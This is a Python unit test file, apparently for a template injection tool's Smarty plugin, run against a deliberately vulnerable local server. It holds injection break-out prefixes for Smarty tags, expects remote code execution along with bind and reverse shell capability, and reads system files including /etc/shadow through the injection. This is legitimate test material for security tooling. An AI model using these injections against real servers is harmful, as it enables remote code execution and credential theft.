import unittest
import requests
import os
import sys
import random

sys.path.insert(1, os.path.join(sys.path[0], '..'))
from plugins.engines.smarty import Smarty
from core.channel import Channel
from core.checks import detect_template_injection
from basetest import BaseTest, EXTRA_DOWNLOAD

class SmartyUnsecuredTest(unittest.TestCase, BaseTest):

    expected_data = {
        'language': 'php',
        'engine': 'smarty',
        'evaluate' : 'php' ,
        'execute' : True,
        'write': True,
        'read': True,
        'trailer': '{%(trailer)s}',
        'header': '{%(header)s}',
        'render': '%(code)s',
        'prefix' : '',
        'suffix' : '',
        'bind_shell' : True,
        'reverse_shell': True
    }

    expected_data_blind = {
        'language': 'php',
        'engine': 'smarty',
        'evaluate_blind': 'php',
        'execute_blind': True,
        'write': True,
        'blind': True,
        'prefix' : '',
        'suffix' : '',
        'bind_shell' : True,
        'reverse_shell': True
    }

    url = 'http://127.0.0.1:15002/smarty-3.1.32-unsecured.php?inj=*&tpl=%s'
    url_blind = 'http://127.0.0.1:15002/smarty-3.1.32-unsecured.php?inj=*&tpl=%s&blind=1'
    plugin = Smarty

    blind_tests = [
        (0, 0, 'AAA%sAAA', {}),
        (5, 1, '{assign value="" var="%s" value=""}', { 'prefix': '1" var="" value=""}{assign var="" value=""}', 'suffix' : ''}),
    ]

    reflection_tests = [
        (0, 0, '%s', { }),
        (0, 0, 'AAA%sAAA', {}),
        (1, 0, '{%s}', { 'prefix': '1}', 'suffix' : '{'}),
        (5, 1, '{if %s}\n{/if}', { 'prefix': '1}{/if}{if 1}', 'suffix' : ''}),
        (5, 1, '{if (%s)}\n{/if}', { 'prefix': '1)}{/if}{if 1}', 'suffix' : ''}),
        (1, 1, '{html_select_date display_days=%s}', { 'prefix': '1}', 'suffix' : '{'}),
        (1, 1, '{html_options values=%s}', { 'prefix': '1}', 'suffix' : '{'}),
        (5, 1, '{assign value="" var="%s" value=""}', { 'prefix': '1" var="" value=""}{assign var="" value=""}', 'suffix' : ''}),
        (5, 1, '{assign value="" var="" value="%s"}', { 'prefix': '1" var="" value=""}{assign var="" value=""}', 'suffix' : ''}),
        (5, 1, '{assign value="" var="" value="`%s`"}', { 'prefix': '1" var="" value=""}{assign var="" value=""}', 'suffix' : ''}),

    ]

    def test_custom_injection_tag(self):

        template = '{* %s *}'

        channel = Channel({
            'url' : self.url.replace('*', '~') % template,
            'force_level': [ 5, 5 ],
            'injection_tag': '~',
            'technique': 'RT'
        })
        
        detect_template_injection(channel, [ self.plugin ])
        
        expected_data = self.expected_data.copy()
        expected_data.update({ 'prefix': '*}', 'suffix' : '{*'})
        
        del channel.data['os']
        self.assertEqual(channel.data, expected_data)

    def test_download(self):

        # This is overriden due to the slight
        # difference from the base test_download()
        # obj.read('/dev/null') -> None

        obj, data = self._get_detection_obj_data(self.url % '')
        self.assertEqual(data, self.expected_data)

        if not EXTRA_DOWNLOAD:
            return

        # Normal ASCII file
        readable_file = '/etc/resolv.conf'
        content = open(readable_file, 'r').read()
        self.assertEqual(content, obj.read(readable_file))

        # Long binary file
        readable_file = '/bin/ls'
        content = open(readable_file, 'rb').read()
        self.assertEqual(content, obj.read(readable_file))

        # Non existant file
        self.assertEqual(None, obj.read('/nonexistant'))
        # Unpermitted file
        self.assertEqual(None, obj.read('/etc/shadow'))
        # Empty file
        self.assertEqual(None, obj.read('/dev/null'))
